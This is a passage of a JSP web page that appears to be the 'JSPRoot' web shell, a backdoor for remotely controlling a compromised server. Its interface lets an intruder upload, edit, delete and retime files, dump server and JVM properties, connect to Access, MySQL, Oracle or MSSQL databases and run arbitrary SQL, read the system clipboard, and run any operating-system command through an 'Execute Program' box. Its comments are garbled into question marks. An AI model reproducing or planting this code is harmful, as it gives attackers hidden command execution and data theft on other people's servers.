      <table width="100%" border="0" cellpadding="4" cellspacing="0">
        <tr class="alt1">
          <td colspan="7" style="padding:5px;"><div style="float:right;">
          	<form method="post" action="" name="upFile" enctype="multipart/form-data">
          	  <input type="hidden" name="action" value="file"/>
          	  <input type="hidden" name="currentPath" value="<%=currentPath %>"/>
              <input class="input" name="v" value="" type="file" />
              <input class="bt" name="doupfile" value="Upload" type="submit" />
            </form>
            </div>
            <a href="javascript:goaction('file','list','<%=webRootPath %>');">WebRoot</a> | <a href="javascript:createdir('<%=currentPath %>');">Create Directory</a> | <a href="javascript:createfile('<%=currentPath %>');">Create File</a> | <a href="javascript:setMulti('<%=currentPath %>');">MultiAppendCode</a> |
            <%for(int i=0;i<driver.size();i++){ %>
            <a href="javascript:goaction('file','list','<%=driver.get(i).getFileName() %>');" title="Driver(<%=driver.get(i).getFileName() %>)<%='\n' %>Total Size:<%=driver.get(i).getTotalSize() %>G<%='\n' %>Free Size:<%=driver.get(i).getFreeSize() %>G">Driver(<%=driver.get(i).getFileName() %>)</a> |
            <%} %>
          </td>
        </tr>
        <tr class="head">
          <td>&nbsp;</td>
          <td>Filename</td>
          <td width="16%">Last modified</td>
          <td width="10%">Size</td>
          <td width="20%">Chmod(Read/Write/Exec)</td>
          <td width="22%">Action</td>
        </tr>
        <tr class=alt1>
          <td align="center"><font face="Wingdings 3" size=4>=</font></td>
          <td nowrap colspan="5"><a href="javascript:goaction('file','list','<%=parentPath %>');">Parent Directory</a></td>
        </tr>
        <tr bgcolor="#dddddd" style="border-top:1px solid #fff;border-bottom:1px solid #ddd;">
          <td colspan="6" height="5"></td>
        </tr>
        <%for(int i=0;i<fileList.size();i++){ %>
        <%if(fileList.get(i).isFolder){ %>
        <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
          <td width="2%" noWrap><font face="wingdings" size="3">0</font></td>
          <td><a href="javascript:goaction('file','list','<%=currentPath+fileList.get(i).getFileName() %>');"><%=fileList.get(i).getFileName() %></a></td>
          <td noWrap><%=fileList.get(i).getLastModifDate() %></td>
          <td noWrap><%=fileList.get(i).isFolder()?"--":fileList.get(i).getFileSize() %></td>
          <td noWrap><a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','r','<%=!fileList.get(i).isCanRead() %>');"><%=fileList.get(i).isCanRead()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','w','<%=!fileList.get(i).isCanWriter() %>');"><%=fileList.get(i).isCanWriter()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','e','<%=!fileList.get(i).isCanExecute() %>');"><%=fileList.get(i).isCanExecute()?"True":"False" %></a></td>
          <td noWrap><a href="javascript:zipfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Zip</a> | <a href="javascript:delfile('deletedir','<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Del</a> | <a href="javascript:renamefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Rename</a>  | <a href="javascript:timefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Time</a></td>
        </tr>
        <%if(fileList.size()!=(i+1)&&!fileList.get(i+1).isFolder){//??????????????????????%>
        <tr bgcolor="#dddddd" style="border-top:1px solid #fff;border-bottom:1px solid #ddd;">
          <td colspan="6" height="5"></td>
        </tr>
        <%}}else{%>
        <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
          <td width="2%" noWrap><font face="wingdings" size="3">2</font></td>
          <td><a href="javascript:openfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');"><%=fileList.get(i).getFileName() %></a></td>
          <td noWrap><%=fileList.get(i).getLastModifDate() %></td>
          <td noWrap><%=fileList.get(i).isFolder()?"--":fileList.get(i).getFileSize() %></td>
          <td noWrap><a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','r','<%=!fileList.get(i).isCanRead() %>');"><%=fileList.get(i).isCanRead()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','w','<%=!fileList.get(i).isCanWriter() %>');"><%=fileList.get(i).isCanWriter()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','e','<%=!fileList.get(i).isCanExecute() %>');"><%=fileList.get(i).isCanExecute()?"True":"False" %></a></td>
          <td noWrap><a href="javascript:downfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Down</a> | <a href="javascript:copyfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Copy</a> | <a href="javascript:openfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Edit</a> | <a href="javascript:delfile('deletefile','<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Del</a> | <a href="javascript:renamefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Rename</a> | <a href="javascript:timefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Time</a></td>
        </tr>
        <%} %>
        <%} %>
        <tr class="alt2">
          <td colspan="10" align="left">Total <%=fileList.size() %> directories Or files</td>
        </tr>
      </table></td>
  </tr>
</table>
<% 
	}else if("open".equals(type)){
		String[] var = value.split("\\|");
		String content = fm.openFile(var[0],var[1]);
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Edit File &raquo;</h2>
      <p>Current File (import new file name and new file)<br />
        <input class="input" name="editfilename" id="editfilename" value="<%=var[0]+var[1] %>" type="text" size="100"  />
      </p>
      <p>File Content<br />
        <textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" ><%=content %></textarea>
      </p>
      <p>
        <input class="bt" type="button" value="Submit" onClick="javascript:editfile('<%=var[0] %>','<%=var[1] %>');">
        <input class="bt" type="button" value="Return" onClick="javascript:goPath('<%=var[0] %>');">
      </p></td>
  </tr>
</table>
<%}}else if("javav".equals(act)){%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Server &raquo;</h2>
      <ul class="info">
        <li><u>JVM???:</u><%=prop.getProperty("java.vm.version")%></li>
        <li><u>JAVA????:</u><%=prop.getProperty("java.home")%></li>
        <li><u>JAVA???:</u><%=prop.getProperty("java.class.path")%></li>
        <li><u>??????:</u><%=prop.getProperty("user.country")%></li>
        <li><u>????:</u><%=prop.getProperty("os.name")%></li>
        <li><u>???:</u><%=prop.getProperty("sun.jnu.encoding")%></li>
        <li><u>????????:</u><%=request.getRequestURL().toString() %></li>
        <li><u>????URL??:</u><%=request.getRequestURI() %></li>
        <li><u>????????:</u><%=prop.getProperty("user.dir")%></li>
        <li><u>?????:</u><%=prop.getProperty("user.home")%></li>
        <li><u>??????:</u><%=prop.getProperty("user.name")%></li>
      </ul>
      <h2>Java &raquo;</h2>
      <%Iterator iter=System.getProperties().keySet().iterator();
      out.println("<ul class=\"info\">");
      while(iter.hasNext()) {
	      try{
	    	  String key=(String)iter.next();
	          out.println("<li><u>"+key+":</u>"+prop.getProperty(key)+"</li>");
	      }catch(Exception ex){
	    	  out.println("<li>??????????</li>");
	      }
      }
      out.println("</ul>");%> 
      </td>
  </tr>
</table>
<%}else if("about".equals(act)){%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>About &raquo;</h2>
      <blockquote>JSPRoot?????jsp????????????????????????????????????????????????????<br/></blockquote></td>
  </tr>
</table>
<%}else if("sqladmin".equals(act)) {//????????
		//????session????conn??????????
		DatabaseManager dm = new DatabaseManager();
		Connection conn = (Connection)session.getAttribute("conn");
		String dbType = (String)request.getParameter("dbType");
		if("".equals(dbType)){
			//???????????session????????dbType??
			dbType = (String)session.getAttribute("dbType");
			dbType = dbType==null?"":dbType;
		}
		String localhost = (String)request.getParameter("localhost");
		String dbName = (String)request.getParameter("dbName");
		String dbUser = (String)request.getParameter("dbUser");
		String dbPass = (String)request.getParameter("dbPass");
		String dbCharset = (String)request.getParameter("dbCharset");
		if(null==conn&&!"".equals(dbType)){
			//???????????conn???????????????????????
			Object obj  = dm.getConnection(dbType,localhost,dbName,dbUser,dbPass,dbCharset);
			if(obj instanceof Connection){
				conn = (Connection)obj;
			}else{
				request.setAttribute("info","????????"+obj.toString());
			}
			session.setAttribute("conn",conn);
			session.setAttribute("dbType",dbType);
		}
		//???????disConn???????
		if("disConn".equals(type)){
			conn.close();
			conn = null;
			dbType = "";
			session.removeAttribute("conn");
			session.removeAttribute("dbType");
		}
		String connBtn;
		String sqlCommandBtn;
		String disabled;
		if(null==conn){
			connBtn = "<input class=\"bt\" name=\"connect\" value=\"Connect\" type=\"button\" size=\"100\"  onclick=\"javascript:dbConn();\"/>";
			sqlCommandBtn = "<input class=\"bt\" name=\"sqlExcute\" value=\"Excute\" type=\"button\" size=\"100\" disabled />";
			disabled = "";
		}else{
			connBtn = "<input class=\"bt\" name=\"DisConnect\" value=\"DisConnect\" type=\"button\" size=\"100\"  onclick=\"javascript:disConn();\"/>";
			sqlCommandBtn = "<input class=\"bt\" name=\"sqlExcute\" value=\"Excute\" type=\"button\" size=\"100\" onclick=\"javascript:sqlExcute();\" />";
			disabled = "disabled";
		}
		List<String> list = dm.getTables(dbType,conn);
		if(list.size()==1&&list.get(0).startsWith("Error")){
			request.setAttribute("info",list.get(0));
			list.remove(0);
		}
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td colspan="2"><h2>Database Manager &raquo;</h2>
    <p>Please select Database type:
  	  <select name="selectDB" id="selectDB" onChange="checkSelectDBType(this.value);" <%=disabled %>><option value="access">Access</option><option value="mysql">Mysql</option><option value="oracle">Oracle</option><option value="mssql">MSSql</option></select>
  	</p>
    <div id="access" class="dbinput" style="display:block;">ACCESS(mdb) path?<input type="text" value="c:/test.mdb" name="localhost" id="access_localhost" class="input" style="width:400px;"/></div>
    <div id="mysql" class="dbinput">DBHost?<input type="text" value="localhost:3306" name="localhost" id="mysql_localhost" class="input"/> DBUser?<input type="text" value="root" name="dbuser" id="mysql_dbuser" class="input"/> DBPass?<input type="text" value="admin" name="dbpass" id="mysql_dbpass" class="input"/> DBCharset?<select class="input" id="charset" name="charset" ><option value="" selected>Default</option><option value="gbk">GBK</option><option value="big5">Big5</option><option value="utf8">UTF-8</option><option value="latin1">Latin1</option></select></div>
    <div id="oracle" class="dbinput">DBHost?<input type="text" value="127.0.0.1:1521" name="localhost" id="oracle_localhost" class="input"/> SID?<input type="text" value="" name="dbname" id="oracle_dbname" class="input"/> DBUser?<input type="text" value="" name="dbuser" id="oracle_dbuser" class="input"/> DBPass?<input type="text" value="" name="dbpass" id="oracle_dbpass" class="input"/></div>
    <div id="mssql" class="dbinput">DBHost?<input type="text" value="127.0.0.1:1433" name="localhost" id="mssql_localhost" class="input"/> DBUser?<input type="text" value="sa" name="dbuser" id="mssql_dbuser" class="input"/> DBPass?<input type="text" value="" name="dbpass" id="mssql_dbpass" class="input"/></div>
    <div style="float:left;"><%=connBtn %></div>
    <%if(!"".equals(dbType)){%><script>$('selectDB').value='<%=dbType %>';checkSelectDBType('<%=dbType %>');</script><%} %>
    </td>
  </tr>
  <tr>
  	<td colspan="2"><h2>All Table &raquo;</h2></td>
  </tr>
  <tr><td colspan="2"><ul style="margin:0px;padding:0px;">
	<%for(int i=0;i<list.size();i++){ %>
	   <%=list.get(i) %>
	<%} %>
  </ul></td></tr>
  <tr>
  	<td colspan="2"><h2>SQL Command &raquo;</h2></td>
  </tr>
  <tr>
  	<td width="30%"><textarea class="area" id="sqlCommand" name="sqlCommand" cols="90" rows="3"><%=value %></textarea></td>
  	<td align="left"><%=sqlCommandBtn %></td>
  </tr>
<%if("sqlExcute".equals(type)){ 
		Object[] obj = dm.excuteSQL(conn,value);
		List<String[]> metaList = new ArrayList<String[]>();
		List<Object[]> arrayList = new ArrayList<Object[]>();
		//????????update?????
		if(obj[0] instanceof Boolean){
			request.setAttribute("info","??????");
		}else if(obj[0] instanceof String){
			request.setAttribute("info",obj[0]);
		}else {
			metaList = (List<String[]>)obj[0];
			arrayList = (List<Object[]>)obj[1];
		}
%>
  <tr>
    <td colspan="2"><h2>SQL Result &raquo;</h2></td>
  </tr>
  <tr>
    <td colspan="2">
	<table width="100%" border="0" cellpadding="15" cellspacing="0">
	   <tr class="head"><%for(int i=0;i<metaList.size();i++){  %>
	     <td><%=metaList.get(i)[0] %><br/>(<%=metaList.get(i)[1] %>-<%=metaList.get(i)[2] %>)</td>
	   <%} %></tr>
	<%for(int i=0;i<arrayList.size();i++){Object[] array = arrayList.get(i); %>
	   <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
	   <%for(int k=0;k<array.length;k++){ %>
	     <td><%=(null==array[k])?"(NULL)":array[k] %></td>
	   <%} %>
	   </tr>	
	<%} %>
	</table>
    </td>
  </tr>
 <%} %>
</table>
<%}else if("shell".equals(act)){//??????????%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Execute Program &raquo;</h2>
      <p>Command<br />
        <input class="input" name="command" id="command" value="<%=value %>" type="text" size="100"  /> <input class="bt" type="button" value="Exec" onClick="javascript:execute();">
      </p>
    </td>
  </tr>
  <tr><td><hr width="100%" noshade /></td></tr>
</table>
<div style="margin:0 15px;"><pre><%=Utils.exec(value,prop) %></pre></div>
<%}else if("clipboard".equals(act)){//???????????????
	//?????????????
	String content = "";
	Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
	if("edit".equals(type)){
		Transferable tf = new StringSelection(value);
		c.setContents(tf, null);
	}
	content = c.isDataFlavorAvailable(DataFlavor.stringFlavor)?(String)c.getData(DataFlavor.stringFlavor):"??????????????????";
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>System Clipboard&raquo;</h2></td>
  </tr>
  <tr>
    <td><pre><%=Utils.conv2Html(content) %></pre></td>
  </tr>
  <tr><td><hr width="100%" noshade /></td></tr>
  <tr>
    <td><textarea id="clipboard" name="clipboard" class="input" style="margin-right:5px;width:500px;height:100px;"></textarea><input class="bt" type="button" value="Update Clipboard" onClick="javascript:clipboard();"></td>
  </tr>
</table>
<%}else if("logout".equals(act)){//????
		session.removeAttribute(sessionName);
		response.sendRedirect(request.getRequestURI().substring(request.getRequestURI().lastIndexOf("/")+1));
}%>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
  <%long endMem = Runtime.getRuntime().freeMemory();long endTime = System.currentTimeMillis();%>
  <span style="float:right;">Processed in <%=endTime-startTime %> Millisecond(m) | Use Memory <%=startMem - endMem %></span><%=Utils.convert() %></div>
<%String info = (String)request.getAttribute("info");if(null!=info&&!"".equals(info)){%>
<div id="infomessage" style="display:none;"><%=info %></div>
<script>document.getElementById("info").style.display="block";document.getElementById("info").innerHTML=$('infomessage').innerHTML;</script>
<%}%>
</body>
</html>